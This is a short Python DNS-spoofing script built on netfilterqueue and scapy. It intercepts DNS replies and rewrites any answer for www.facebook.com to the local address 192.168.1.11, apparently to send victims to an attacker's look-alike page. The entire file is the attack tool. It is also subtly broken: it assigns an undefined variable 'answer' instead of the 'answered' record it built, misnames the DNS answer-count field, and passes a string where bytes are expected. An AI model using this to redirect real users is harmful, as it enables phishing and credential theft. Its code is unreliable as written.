import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSRR].qname
        if "www.facebook.com" in qname:
            print("Spoofing the Target .... !")
            answered = scapy.DNSRR(rrname=qname,rdata="192.168.1.11")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetFilterQueue()
queue.bind(0,process_packet)
queue.run()
